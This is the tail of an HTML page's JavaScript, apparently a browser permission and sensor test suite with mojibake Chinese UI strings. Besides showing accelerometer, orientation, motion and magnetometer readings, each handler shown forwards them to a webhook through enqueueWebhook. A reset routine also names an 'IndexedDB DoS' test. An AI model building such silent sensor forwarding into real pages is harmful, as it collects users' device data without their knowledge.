                            if (!shouldUpdate('accel_dm')) return;
                            const a = e.accelerationIncludingGravity || e.acceleration;
                            if (a && (a.x != null || a.y != null || a.z != null)) {
                                const result = `âœ… åŠ é€Ÿåº¦(å…¼å®¹):\nX: ${a.x?.toFixed?.(3)} m/sÂ²\nY: ${a.y?.toFixed?.(3)} m/sÂ²\nZ: ${a.z?.toFixed?.(3)} m/sÂ²`;
                                testResults.accelerometer = { status: 'success', result };
                                if (!initialized) {
                                    updateTestCard('accelerometer', 'success', result);
                                    initialized = true;
                                    resolve();
                                } else {
                                    const el = document.getElementById('accelerometer-result');
                                    if (el) el.textContent = result;
                                }
                                enqueueWebhook('accelerometer_reading_dm', { x: a?.x, y: a?.y, z: a?.z });
                            } else if (!initialized) {
                                const result = 'âš ï¸ æœªè·å–åˆ°åŠ é€Ÿåº¦æ•°æ®';
                                testResults.accelerometer = { status: 'warning', result };
                                updateTestCard('accelerometer', 'warning', result);
                                initialized = true;
                                resolve();
                            }
                        };
                        window.addEventListener('devicemotion', handler);
                        activeListeners.push({ target: window, type: 'devicemotion', handler });
                        setTimeout(() => {
                            if (!initialized) {
                                reject(new Error('æœªæ”¶åˆ° devicemotion äº‹ä»¶'));
                            }
                        }, 3000);
                    });
                } else {
                    throw new Error('æµè§ˆå™¨ä¸æ”¯æŒåŠ é€Ÿåº¦æ¥å£');
                }
            } catch (error) {
                const result = `âŒ åŠ é€Ÿåº¦è®¡æµ‹è¯•å¤±è´¥: ${error.message}`;
                testResults.accelerometer = { status: 'error', result };
                updateTestCard('accelerometer', 'error', result);
            }
            completedTests++;
            updateProgress();
            updateSummary();
        }

        async function testOrientation() {
            updateTestCard('orientation', 'pending', 'æ­£åœ¨æµ‹è¯•æ–¹å‘ä¼ æ„Ÿå™¨...');
            try {
                await ensureMotionOrientationPermission();
                if ('ondeviceorientation' in window) {
                    await new Promise((resolve, reject) => {
                        let initialized = false;
                        const handler = (e) => {
                            if (!shouldUpdate('orientation')) return;
                            const result = `âœ… æ–¹å‘æ•°æ®:\nalpha: ${e.alpha?.toFixed?.(2)}\nbeta: ${e.beta?.toFixed?.(2)}\ngamma: ${e.gamma?.toFixed?.(2)}`;
                            testResults.orientation = { status: 'success', result };
                            if (!initialized) {
                                updateTestCard('orientation', 'success', result);
                                initialized = true;
                                resolve();
                            } else {
                                const el = document.getElementById('orientation-result');
                                if (el) el.textContent = result;
                            }
                            enqueueWebhook('orientation_reading', { alpha: e.alpha, beta: e.beta, gamma: e.gamma });
                        };
                        window.addEventListener('deviceorientation', handler);
                        activeListeners.push({ target: window, type: 'deviceorientation', handler });
                        setTimeout(() => {
                            if (!initialized) {
                                reject(new Error('æœªæ”¶åˆ° deviceorientation äº‹ä»¶'));
                            }
                        }, 3000);
                    });
                } else {
                    throw new Error('æµè§ˆå™¨ä¸æ”¯æŒ DeviceOrientation');
                }
            } catch (error) {
                const result = `âŒ æ–¹å‘ä¼ æ„Ÿå™¨æµ‹è¯•å¤±è´¥: ${error.message}`;
                testResults.orientation = { status: 'error', result };
                updateTestCard('orientation', 'error', result);
            }
            completedTests++;
            updateProgress();
            updateSummary();
        }

        async function testMotion() {
            updateTestCard('motion', 'pending', 'æ­£åœ¨æµ‹è¯•è¿åŠ¨ä¼ æ„Ÿå™¨...');
            try {
                await ensureMotionOrientationPermission();
                if ('ondevicemotion' in window) {
                    await new Promise((resolve, reject) => {
                        let initialized = false;
                        const handler = (e) => {
                            if (!shouldUpdate('motion')) return;
                            const a = e.accelerationIncludingGravity || e.acceleration;
                            const rr = e.rotationRate;
                            const result = `âœ… è¿åŠ¨æ•°æ®:\nåŠ é€Ÿåº¦: ${a?.x?.toFixed?.(2)}, ${a?.y?.toFixed?.(2)}, ${a?.z?.toFixed?.(2)}\nè§’é€Ÿåº¦: ${rr?.alpha?.toFixed?.(2)}, ${rr?.beta?.toFixed?.(2)}, ${rr?.gamma?.toFixed?.(2)}\né—´éš”: ${e.interval}ms`;
                            testResults.motion = { status: 'success', result };
                            if (!initialized) {
                                updateTestCard('motion', 'success', result);
                                initialized = true;
                                resolve();
                            } else {
                                const el = document.getElementById('motion-result');
                                if (el) el.textContent = result;
                            }
                            enqueueWebhook('motion_reading', {
                                acc: { x: a?.x, y: a?.y, z: a?.z },
                                rot: { alpha: rr?.alpha, beta: rr?.beta, gamma: rr?.gamma },
                                interval: e.interval
                            });
                        };
                        window.addEventListener('devicemotion', handler);
                        activeListeners.push({ target: window, type: 'devicemotion', handler });
                        setTimeout(() => {
                            if (!initialized) {
                                reject(new Error('æœªæ”¶åˆ° devicemotion äº‹ä»¶'));
                            }
                        }, 3000);
                    });
                } else {
                    throw new Error('æµè§ˆå™¨ä¸æ”¯æŒ DeviceMotion');
                }
            } catch (error) {
                const result = `âŒ è¿åŠ¨ä¼ æ„Ÿå™¨æµ‹è¯•å¤±è´¥: ${error.message}`;
                testResults.motion = { status: 'error', result };
                updateTestCard('motion', 'error', result);
            }
            completedTests++;
            updateProgress();
            updateSummary();
        }

        async function testMagnetometer() {
            updateTestCard('magnetometer', 'pending', 'æ­£åœ¨æµ‹è¯•ç£åŠ›è®¡...');
            try {
                if ('Magnetometer' in window) {
                    await new Promise((resolve, reject) => {
                        try {
                            const mag = new Magnetometer({ frequency: 10 });
                            let initialized = false;
                            const onReading = () => {
                                if (!shouldUpdate('mag')) return;
                                const result = `âœ… ç£åŠ›è®¡:\nX: ${mag.x?.toFixed?.(2)} ÂµT\nY: ${mag.y?.toFixed?.(2)} ÂµT\nZ: ${mag.z?.toFixed?.(2)} ÂµT`;
                                testResults.magnetometer = { status: 'success', result };
                                if (!initialized) {
                                    updateTestCard('magnetometer', 'success', result);
                                    initialized = true;
                                    resolve();
                                } else {
                                    const el = document.getElementById('magnetometer-result');
                                    if (el) el.textContent = result;
                                }
                                enqueueWebhook('magnetometer_reading', { x: mag.x, y: mag.y, z: mag.z });
                            };
                            mag.addEventListener('reading', onReading);
                            mag.addEventListener('error', (event) => {
                                if (!initialized) reject(event.error || new Error('ç£åŠ›è®¡é”™è¯¯'));
                            });
                            activeSensors.push(mag);
                            mag.start();
                            setTimeout(() => {
                                if (!initialized) {
                                    reject(new Error('ç£åŠ›è®¡è¯»å–è¶…æ—¶'));
                                }
                            }, 3000);
                        } catch (e) { reject(e); }
                    });
                } else {
                    const result = 'âš ï¸ æµè§ˆå™¨/è®¾å¤‡ä¸æ”¯æŒç£åŠ›è®¡';
                    testResults.magnetometer = { status: 'warning', result };
                    updateTestCard('magnetometer', 'warning', result);
                }
            } catch (error) {
                const result = `âŒ ç£åŠ›è®¡æµ‹è¯•å¤±è´¥: ${error.message}`;
                testResults.magnetometer = { status: 'error', result };
                updateTestCard('magnetometer', 'error', result);
            }
            completedTests++;
            updateProgress();
            updateSummary();
        }
        
        async function startAllTests() {
            if (isTestRunning) return;
            
            isTestRunning = true;
            completedTests = 0;
            totalTests = Object.keys(testResults).length;
            document.getElementById('total-tests').textContent = totalTests;
            
            document.getElementById('startBtn').disabled = true;
            document.getElementById('stopBtn').disabled = false;
            document.getElementById('countdown').style.display = 'none';
            
            // å¹¶è¡Œæ‰§è¡Œæ‰€æœ‰æµ‹è¯•
            const tests = [
                testGeolocation(),
                testMicrophone(),
                testCamera(),
                testNotification(),
                testClipboard(),
                testStorage(),
                testGyroscope(),
                testAccelerometer(),
                testOrientation(),
                testMotion(),
                testMagnetometer()
            ];
            
            try {
                await Promise.allSettled(tests);
            } catch (error) {
                console.error('æµ‹è¯•æ‰§è¡Œé”™è¯¯:', error);
            }
            
            isTestRunning = false;
            document.getElementById('startBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
        }
        
        function stopAllTests() {
            isTestRunning = false;
            // åœæ­¢ä¼ æ„Ÿå™¨
            try { activeSensors.forEach(s => { try { s.stop && s.stop(); } catch (_) {} }); } catch (_) {}
            activeSensors.length = 0;
            // è§£é™¤äº‹ä»¶ç›‘å¬
            try { activeListeners.forEach(l => { try { l.target.removeEventListener(l.type, l.handler); } catch (_) {} }); } catch (_) {}
            activeListeners.length = 0;
            document.getElementById('startBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
        }
        
        function resetAllTests() {
            isTestRunning = false;
            // æ¸…ç†æ´»è·ƒèµ„æº
            try { activeSensors.forEach(s => { try { s.stop && s.stop(); } catch (_) {} }); } catch (_) {}
            activeSensors.length = 0;
            try { activeListeners.forEach(l => { try { l.target.removeEventListener(l.type, l.handler); } catch (_) {} }); } catch (_) {}
            activeListeners.length = 0;
            completedTests = 0;
            
            testResults = {
                geolocation: { status: 'pending', result: '' },
                microphone: { status: 'pending', result: '' },
                camera: { status: 'pending', result: '' },
                notification: { status: 'pending', result: '' },
                clipboard: { status: 'pending', result: '' },
                storage: { status: 'pending', result: '' },
                gyroscope: { status: 'pending', result: '' },
                accelerometer: { status: 'pending', result: '' },
                orientation: { status: 'pending', result: '' },
                motion: { status: 'pending', result: '' },
                magnetometer: { status: 'pending', result: '' }
            };
            
            // é‡ç½®æ‰€æœ‰å¡ç‰‡
            const testNames = ['geolocation', 'microphone', 'camera', 'notification', 'clipboard', 'storage', 'gyroscope', 'accelerometer', 'orientation', 'motion', 'magnetometer'];
            testNames.forEach(name => {
                const displayName = name === 'indexeddbDos' ? 'IndexedDB DoS' : name;
                updateTestCard(name, 'pending', `å‡†å¤‡æµ‹è¯•${displayName}æƒé™...`);
            });
            
            // æ›´æ–°æ€»æµ‹è¯•æ•°
            totalTests = Object.keys(testResults).length;
            document.getElementById('total-tests').textContent = totalTests;
            
            // é‡ç½®è¿›åº¦æ¡å’Œç»Ÿè®¡
            updateProgress();
            updateSummary();
            
            document.getElementById('startBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
        }
    </script>
</body>
</html>
